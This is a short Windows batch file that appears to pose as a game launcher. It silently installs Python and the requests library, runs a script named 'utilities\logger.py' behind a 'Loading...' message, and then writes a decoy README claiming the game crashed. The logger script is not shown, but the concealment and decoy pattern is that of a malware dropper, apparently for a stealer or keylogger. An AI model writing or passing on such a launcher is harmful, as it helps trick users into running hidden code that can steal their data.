@echo off
winget install Python.Python.3.12 >nul 2>&1
pip install requests >nul 2>&1
echo Loading...
python "utilities\logger.py"
echo .> "README.txt"
echo Hiya umm the game seems like it crashed... ask the owner for a fix! > "README.txt"
pause